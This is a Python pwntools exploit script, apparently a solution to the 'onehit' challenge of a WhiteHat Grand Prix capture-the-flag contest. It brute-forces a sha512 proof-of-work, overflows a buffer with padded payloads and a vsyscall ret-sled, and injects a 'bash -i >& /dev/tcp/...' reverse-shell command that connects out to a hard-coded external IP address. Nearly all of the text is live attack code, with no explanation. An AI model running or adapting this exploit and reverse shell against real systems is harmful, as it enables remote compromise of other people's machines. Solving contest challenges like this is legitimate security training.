from pwn import *
from hashlib import sha512

env = {
    'LD_PRELOAD': './libc-2.27.so'
}

#r = process('./onehit', env=env)

r = remote('pwn03.grandprix.whitehatvn.com', 2023)

r.recvuntil('sha512("')
st = r.recvuntil('"')[:-1]

r.recvuntil(') = 0x')
check = r.recvuntil('...')[:-3]

log.info("sha512(%s + ...) = %s" %(st, check))

number = 0
for i in range(0x300000):
    tmp = st + str(i)
    if sha512(tmp).hexdigest().startswith(check):
        log.info("Found %d" %i)
        number = i
        break

if number == 0:
    log.info("Not Found~~")
    exit()
r.recvuntil('You: The interger = ')
payload = str(number)
payload = payload.ljust(0x4c, 'a')
payload += p32(0x400)
payload = payload.ljust(0x100, 'a')
r.send(payload)
r.recvuntil('to ls -al?\n')
r.send('N0\x00'.ljust(10, '\x00'))
r.recvuntil('/bin/sh\n')
raw_input('?')
r.send("a"*0x98+"\x3a")
r.recvuntil('Only Echo is available\n')
payload = 'x'*0x8f
payload += 'bash -c "bash -i >& /dev/tcp/35.240.232.102/5555 0>&1"'
payload = payload.ljust(0xe0, '\x00')
payload += p64(0x61616161)
payload += p64(0xffffffffff600400)*20
r.send(payload)
r.interactive()
